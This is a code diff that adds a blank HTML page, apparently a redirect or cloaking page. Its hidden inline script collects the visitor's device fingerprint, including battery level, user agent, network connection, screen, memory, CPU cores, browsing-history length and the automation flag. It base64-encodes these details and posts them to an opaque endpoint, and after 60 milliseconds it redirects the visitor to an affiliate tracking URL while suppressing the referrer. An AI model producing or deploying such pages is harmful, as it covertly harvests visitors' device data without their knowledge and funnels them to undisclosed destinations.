@@ -1,0 +1,93 @@
+<html><head><meta name="referrer" content="no-referer">
+<link rel="icon" href="data:;base64,iVBORw0KGgo=">
+<script>
+    let n=navigator,s=screen,u=undefined,c = 'connection' in n ? n.connection : u ,d = document,g = 'getElementById';
+    try {
+        let promises = [];
+        if(typeof Promise !== "undefined" && Promise.toString().indexOf("[native code]") !== -1){
+            promises.push(n.getBattery());
+            Promise
+                .all(promises)
+                .then(function(results){
+                    let b = results[0];
+                    log({
+                        battery:{
+                            charging: b.charging,
+                            chargingTime: b.chargingTime,
+                            dischargingTime: b.dischargingTime,
+                            level: b.level,
+                        }
+                    });
+                }).catch(function(err){
+                log({error: err});
+                document.write(err);
+            });
+        }
+        else{log({});}
+        function log(promising) {
+            let info = {
+                timeOpened: new Date(),
+                timezone: (new Date()).getTimezoneOffset(),
+                browser: {
+                    navigator: n,
+                    name: n.appName,
+                    engine: n.product,
+                    ua: n.userAgent,
+                    language: n.language,
+                    platform: n.platform,
+                    referrer: document.referrer,
+                    previousSites: history.length,
+                },
+                enabled: {
+                    javaScript: true,
+                    java: n.javaEnabled(),
+                    cookies: n.cookieEnabled,
+                },
+                connection: c !== u ? {
+                    type: c.type,
+                    effectiveType: c.effectiveType,
+                    downlink: c.downlink,
+                    downlinkMax: c.downlinkMax,
+                    rtt: c.rtt,
+                    saveData: c.saveData,
+                } : {},
+                screen: {
+                    height: 'height' in s ? s.height : undefined,
+                    width: 'width' in s ? s.width : undefined,
+                    colorDepth: s.colorDepth,
+                    pixelDepth: s.pixelDepth,
+                    brightness: 'mozBrightness' in s ? s.mozBrightness : undefined,
+                    //orientation: isNaN(s.orientation) ? Math.abs(window.orientation) - 90 === 0 ? "landscape" : "portrait" : window.s.orientation.type,
+                },
+                device: {
+                    ram: n.deviceMemory,
+                    cpuCores: n.hardwareConcurrency,
+                    devicePixelRatio: window.devicePixelRatio,
+
+                },
+                misc: {
+                    webdriver: n.webdriver,
+                    language: n.language,
+                    languages: n.languages,
+                },
+
+            };
+            if(promising!==undefined)
+                info.promising = promising;
+            let x = new XMLHttpRequest();
+            x.open("POST", "/c/21G27093108A026179026032Eu1mP", true);
+            x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            x.send('data=' + window.btoa(unescape(JSON.stringify(info))));
+        }
+    }
+    catch(ex){}
+</script>
+<script type="text/javascript">
+    //window.onpopstate = function(e) {if(e && e.state) {location.reload();}}
+    //if (history.pushState){for(let i=2;i<5;i++){history.pushState(i,'','/b/'+i);}}
+    window.setTimeout(function(){window.location='http://kbtools.net/wktselxsp?srv=wecare&p=waki-telesat&ad=xsp&aff_sub=21G27093108A026179026032Eu1mP';},60);
+</script>
+</head><body>
+    
+
+</body></html>
